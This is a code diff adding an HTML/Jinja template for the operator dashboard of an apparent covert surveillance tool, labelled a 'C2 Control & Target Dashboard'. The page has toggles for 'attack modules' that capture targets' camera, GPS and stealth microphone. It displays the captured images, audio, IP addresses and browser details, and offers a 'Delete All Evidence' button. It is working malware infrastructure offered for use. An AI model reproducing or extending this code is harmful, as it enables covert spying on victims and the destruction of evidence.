@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Admin Panel</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background-color: #f0f2f5; margin: 0; }
+        h2 { color: #1a1a1a; text-align: center; font-size: 28px; }
+        h3 { color: #444; border-bottom: 2px solid #ccc; padding-bottom: 10px; margin-top: 30px; font-size: 22px; }
+        
+        /* C2 Control Panel Styles */
+        .controls { display: flex; gap: 20px; justify-content: center; margin-bottom: 20px; flex-wrap: wrap; }
+        .control-box { background: white; padding: 15px 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; font-weight: bold; color: #333; }
+        
+        /* iOS Style Toggle Switch */
+        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #2196F3; }
+        input:checked + .slider:before { transform: translateX(24px); }
+        input:disabled + .slider { opacity: 0.5; cursor: not-allowed; }
+
+        .log-section { background: #0d1117; color: #00ff00; padding: 15px; border-radius: 8px; margin-bottom: 30px; font-family: 'Courier New', monospace; font-size: 14px; overflow-x: auto; max-height: 250px; overflow-y: scroll; }
+        .log-section p { margin: 8px 0; border-bottom: 1px dashed #30363d; padding-bottom: 8px; }
+        .log-section a { color: #58a6ff; font-weight: bold; }
+        
+        .gallery { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
+        .card { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); width: 260px; }
+        .card img { width: 100%; border-radius: 6px; margin-bottom: 12px; border: 1px solid #eee; }
+        .img-info { background-color: #f8f9fa; padding: 10px; border-radius: 6px; margin-bottom: 12px; font-size: 13px; }
+        .delete-btn { background-color: #ff9800; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;}
+        .delete-all-btn { background-color: #dc3545; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; float: right; margin-bottom: 20px;}
+    </style>
+</head>
+<body>
+
+    <h2>🎯 C2 Control & Target Dashboard</h2>
+
+    <!-- Attack Modules / Command and Control -->
+    <h3>⚙️ Active Attack Modules</h3>
+    <div class="controls">
+        <div class="control-box">
+            📸 Camera Capture
+            <label class="switch">
+                <input type="checkbox" id="cam-toggle" {% if settings.camera %}checked{% endif %} onchange="updateSettings()">
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="control-box">
+            📍 GPS Location
+            <label class="switch">
+                <input type="checkbox" id="loc-toggle" {% if settings.location %}checked{% endif %} onchange="updateSettings()">
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="control-box">
+            🎙️ Microphone (Stealth)
+            <label class="switch">
+                <input type="checkbox" id="mic-toggle" {% if settings.mic %}checked{% endif %} onchange="updateSettings()">
+                <span class="slider"></span>
+            </label>
+        </div>
+    </div>
+
+    <!-- OSINT Logs -->
+    <h3>📡 Target OSINT & GPS Logs</h3>
+    <div class="log-section">
+        {% for log in logs %}<p>{{ log|safe|urlize(target='_blank') }}</p>{% else %}<p>No user data captured yet.</p>{% endfor %}
+    </div>
+
+    <!-- Audio Section -->
+    <h3>🎙️ Captured Audio Recordings</h3>
+    <div class="gallery">
+        {% for audio in audios %}
+        <div class="card" id="card-{{ audio.filename }}">
+            <audio controls style="width: 100%; margin-bottom: 10px; border-radius: 6px;">
+                <source src="{{ url_for('uploaded_file', filename=audio.filename) }}" type="audio/webm">
+                Your browser does not support the audio element.
+            </audio>
+            <div class="img-info">
+                <p>🕒 Time: {{ audio.time }}</p>
+                <p>🌐 IP: {{ audio.ip }}</p>
+                <p>💻 Browser: {{ audio.browser }}</p>
+            </div>
+            <button class="delete-btn" onclick="deleteImage('{{ audio.filename }}')">Delete</button>
+        </div>
+        {% else %}
+        <p style="color: #666; text-align: center; width: 100%;">No audio captured yet.</p>
+        {% endfor %}
+    </div>
+
+    <!-- Images -->
+    <h3>📸 Live Camera Captures <button class="delete-all-btn" onclick="deleteAll()">🗑️ Delete All Evidence</button></h3>
+    <div style="clear: both;"></div>
+    <div class="gallery">
+        {% for img in images %}
+        <div class="card" id="card-{{ img.filename }}">
+            <img src="{{ url_for('uploaded_file', filename=img.filename) }}" alt="Target Capture">
+            <div class="img-info">
+                <p>🕒 Time: {{ img.time }}</p>
+                <p>🌐 IP: {{ img.ip }}</p>
+                <p>💻 Browser: {{ img.browser }}</p>
+            </div>
+            <button class="delete-btn" onclick="deleteImage('{{ img.filename }}')">Delete</button>
+        </div>
+        {% endfor %}
+    </div>
+
+    <script>
+        // সেটিংস আপডেট করে সার্ভারে পাঠানো
+        function updateSettings() {
+            const config = {
+                camera: document.getElementById('cam-toggle').checked,
+                location: document.getElementById('loc-toggle').checked,
+                mic: document.getElementById('mic-toggle').checked
+            };
+            fetch('/api/settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(config)
+            });
+        }
+
+        function deleteImage(filename) {
+            if(confirm("Delete this capture?")) {
+                fetch('/delete/' + filename, { method: 'POST' }).then(res => res.json()).then(data => { if(data.status === "success") document.getElementById('card-' + filename).remove(); });
+            }
+        }
+        function deleteAll() {
+            if(confirm("Delete ALL captures (Images & Audio)?")) {
+                fetch('/delete_all', { method: 'POST' }).then(res => res.json()).then(data => { 
+                    if(data.status === "success") {
+                        document.querySelectorAll('.gallery').forEach(el => el.innerHTML = '');
+                    }
+                });
+            }
+        }
+    </script>
+</body>
+</html>
